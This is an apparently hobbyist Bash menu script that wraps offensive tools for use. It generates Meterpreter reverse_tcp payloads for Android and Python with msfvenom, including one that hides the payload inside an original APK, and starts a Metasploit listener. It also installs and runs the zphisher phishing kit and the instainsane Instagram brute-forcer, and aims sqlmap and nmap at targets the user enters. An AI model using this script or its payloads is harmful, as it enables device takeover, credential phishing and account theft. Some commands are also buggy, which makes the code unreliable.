banerelaraby(){
clear

cat << "EOF"
        ███████╗██╗     ██████╗  █████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗        
        ██╔════╝██║     ╚════██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝        
        █████╗  ██║      █████╔╝███████║██████╔╝███████║██████╔╝ ╚████╔╝         
        ██╔══╝  ██║      ╚═══██╗██╔══██║██╔══██╗██╔══██║██╔══██╗  ╚██╔╝          
        ███████╗███████╗██████╔╝██║  ██║██║  ██║██║  ██║██████╔╝   ██║           
        ╚══════╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝    ╚═╝           
EOF

printf '\e[1;31m   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'
echo -e "\e[32m this tool is done by el3araby https://instagram.com/el3rraby \e[0m"

echo -e "\e[31m ------------------------------------------------ \e[0m"
echo " 1- zphisher                                    - "
echo " 2- ELARABYGBS                                  - "
echo " 3- MAKE A PAYLOAD FOR ANDROID                  - "
echo " 4- MAKE A PAYLOAD FOR ANDROID ON ORG APK       - "
echo " 5- MAKE A PAYLOAD FOR ALL OS (PYTHON)          - "
echo " 6- run metasploit listner                      - "
echo " 7- download zphisher                           - "
echo " 8- download ELARABYGBS                         - "
echo " 9- SCAN ip or domain by nmap                   - "
echo " 10- download HACKINGTOOL                       - "
echo " 11- run HACKINGTOOL                            - "
echo " 12- Trying SQLMAP ON TARGET                    - "
echo " 13- CREATE A QR CODE FROM LINK                 - "
echo " 14- DOWNLOAD INSTAINSANE                       - "
echo " 15- INSTAINSANE TO BRUTE IG ACCOUNT            - "
echo " 16- install APKTOOL 2.9.3 ,apksigner,zipalign  - "
echo " 17- REQUARED ADD NAME TO YOUR LINUX TERMINAL   - "
echo " 18- ADD NAME TO YOUR LINUX TERMINAL            - "
echo " 19- HELP                                       - "
echo " 20- UPDATE AND UPGRADE YOUR LINUX              - "
echo " 21- CONTACT WITH ME                            - "
echo -e "\e[31m ------------------------------------------------ \e[0m"
echo -e "\e[32m enter the number of option you want to run  :   \e[0m"
}
author(){
echo " ----------------------------- "
echo " this tool maded by el3araby "
echo " I LOVE U "
echo " ----------------------------- "
}
el3araby(){
read choice

case $choice in
	1)
		echo "runing zphisher"
		cd zphisher && bash zphisher.sh
		;;
	2)
		echo "rnning ELARABYGBS"
		cd ELARABYGBS && bash el3araby.sh
		;;
	3)
		echo "makeing a payload"
		read -p "ENTER your LHOST " LHOST
		read -p " enter your LPORT : " LPORT
		read -p " enter your apk final name : " NAME
		echo " please wait "
		msfvenom -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $NAME.apk
		;;
	4)
		echo "makeing a payload"
		read -p "ENTER THE PATH OF ORIGINAL APK" ORG
                read -p "ENTER your LHOST " LHOST
                read -p "ENTER your LPORT : " LPORT
                read -p "ENTER your apk final name : " NAME
		msfvenom -x $ORG -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $NAME.apk
		;;
	5)
		echo "makeing a payload"
                read -p "ENTER your LHOST " LHOST
                read -p "ENTER your LPORT : " LPORT
                read -p "ENTER your apk final name : " NAME
		msfvenom -p python/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $NAME.py	
		;;
	6)
		echo "runing metasploit listner"
		read -p "ENTER your LHOST " LHOST
                read -p "ENTER your LPORT : " LPORT
		read -p "enter payload type ( APK OR PY ) : " PAYLOADTYPE
		if [ "$PAYLOADTYPE" = "APK" ] || [ "$PAYLOADTYPE" = "apk" ]; then
			echo "runing listner for android " 
			msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
		elif [ "$PAYLOADTYPE" = "PY" ] || [ "$PAYLOADTYPE" = "py" ]; then
			echo "runing listner for ALL OS (python) " 
			msfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
		else 
			echo "you entered something wrong please try again ( payloads type avilable only apk or py )"
		fi
		;;
	7)
		echo "downloading zphisher"
		git clone https://github.com/htr-tech/zphisher.git
		;;
	8)
		echo "downloading ELARABYGBS"
		git clone https://github.com/b7of/ELARABYGBS.git
		;;
	9)
		read -p "ENTER THE IP OR DOMAIN " IP
		nmap -T4 -A -v $IP
		;;
	10)
		echo"DOWNLOADING HACKINGTOOL"
		git clone https://github.com/Z4nzu/hackingtool.git && chmod -R 755 hackingtool && cd hackingtool && sudo bash install.sh && sudo hackingtool
		;;
	11) 
		echo"RUNING HACKINGTOOL"
		sudo hackingtool
		;;
	12) 
		read -p "ENTER YOUR TARGET LINK : " TARGET
		sqlmap -u $TARGET --dbs --batch
		;;
	13)
		sudo apt install qrencode -y
		clear
		author
		echo "creating a QR code "
		read -p "ENTER THE LINK TO MAKE QR " LINK
		read -p "ENTER NAME TO SAFE QR CODE " QRN
		qrencode -o $QRN "$LINK"
		echo "THE QR CREATED YOU CAN FIND IT IN TOOL FILE"
		;;
	14)
		echo "DOWNLOADING INSTAINSANE"
		git clone https://github.com/umeshshinde19/instainsane.git && cd instainsane && chmod +x install.sh && chmod +x instainsane.sh && sudo ./install.sh && sudo ./instainsane.sh
		;;
	15)
		echo "RUNING INSTAINSANE"
		cd instainsane && sudo bash instainsane.sh
		;;
	16)
		sudo apt-get install apktool -y
		apktool --version
		echo " removing old apktool "
		sudo rm -f /usr/local/bin/apktool
		sudo rm -f /usr/local/bin/apktool.jar
		echo " DONE "
		echo " DOWLOADING apktool 2.9.3 ... "
		wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar -o apktool.jar
		wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -o apktool
		echo " DONE "
		echo " MOVING APKTOOL TO /usr/local/bin ... "
		sudo mv apktool.jar /usr/local/bin/apktool.jar
		sudo mv apktool /usr/local/bin/apktool
		echo " ADD THE PERMISSIONS TO APKTOOL ... "
		sudo chmod +x /usr/local/bin/apktool.jar
		sudo chmod +x /usr/local/bin/apktool
		echo " DONE "
		apktool --version
		echo " installing apksigner & zipalign "
		sudo apt-get install apksigner -y && sudo apt-get install zipalign -y
		echo " NOW YOU CAN MAKE ANDRIOD PAYLOADS BY MY TOOL USE OPTION 3 OR 4 "
		;;
	17)
		echo "installing the tools ..."
		sudo apt-get install figlet -y && sudo apt-get install lolcat -y
		git clone https://github.com/xero/figlet-fonts && cd figlet-fonts && rm README.md && mv ANSI\ Shadow.flf ANSI_Shadow &&sudo mv * /usr/share/figlet 
		;;
	18)
		echo "ADDING NAME TO YOUR TERMINAL"
		read -p "ENTER THE NAME : " TNAME
		read -p "USE DEFOULT FONT OR ADD FONT NAME ? IF USE DEFULT WRITE YES : " OP
		if [ "$OP" = "YES" ] || [ "$OP" = "yes" ]; then
			sudo echo "figlet -c -f ANSI_Shadow $TNAME | lolcat" >> ~/.zshrc
		else
			read -p "ENTER THE FONT NAME YOU CAN FIND IT ON /usr/share/figlet" FONT
			sudo echo "figlet -c -f $FONT $TNAME | lolcat" >> ~/.zshrc
		fi
		;;
	19)
		echo " YOU CAN USE MY TOOL BY WRITE A NUMBER OF THE TASK YOU WANT "
		echo " if you have any question contact me "
		firefox https://instagram.com/el3rraby
		;;
	20) 
		echo "UPDATE AND UPGRADING"
		sudo apt-get update -y && sudo apt-get full-upgrade -y
		;;
	21)
		echo -e "\e[32m ENG : EL3ARABY "
		echo " github : https://github.com/b7of "
		echo " instagram : https://instagram.com/el3rraby "
		echo " telegram : @MM_EZ "
		firefox https://instagram.com/el3rraby
		;;
	*)
		echo" invaild option enter the number from 1 to 6 "
		echo" good bye "
		;;
esac
}

banerelaraby
el3araby
author
